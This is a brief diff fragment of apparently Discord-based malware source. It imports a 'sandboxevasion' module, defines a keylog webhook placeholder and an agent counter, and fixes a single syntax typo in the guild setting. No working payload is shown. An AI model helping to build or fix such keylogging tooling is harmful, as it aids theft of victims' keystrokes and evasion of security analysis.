@@ -12,7 +12,7 @@ from libraries import sandboxevasion, maciassdopia
 # ========
 
 
-GUILD = discord.Object(id - "{GUILD}")
+GUILD = discord.Object(id = "{GUILD}")
 CHANNEL = "{CHANNEL}"
 KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"
 CURRENT_AGENT = 0
